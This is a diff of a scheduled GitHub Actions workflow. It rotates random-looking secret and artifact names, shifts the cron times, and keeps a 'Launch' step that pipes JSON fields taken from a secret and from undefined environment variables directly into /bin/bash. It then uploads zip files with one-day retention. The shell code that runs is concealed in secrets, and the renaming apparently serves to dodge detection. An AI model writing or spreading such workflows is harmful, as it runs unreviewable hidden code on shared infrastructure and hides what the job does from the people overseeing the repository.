@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '56 2,8,14,20 * * *'
+    - cron: '13 3,9,15,21 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -14,16 +14,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          t40: ${{ secrets.t40 }}
+          rkkh6958: ${{ secrets.rkkh6958 }}
         run: |
-          printf '%s' "$t40" | jq -r .h17585 | /bin/bash
-          printf '%s' "$wb822" | jq -r .bjkl333 | /bin/bash
-          echo $cjmzj504 | jq -r .rkz889 | /bin/bash
-          echo $r331 | jq -r .nw5 | /bin/bash
+          printf '%s' "$rkkh6958" | jq -r .x270 | /bin/bash
+          printf '%s' "$ez28472" | jq -r .pnud5481 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: 28e52wbE
+          name: hSLEh6dV
           path: "*.zip"
           retention-days: 1
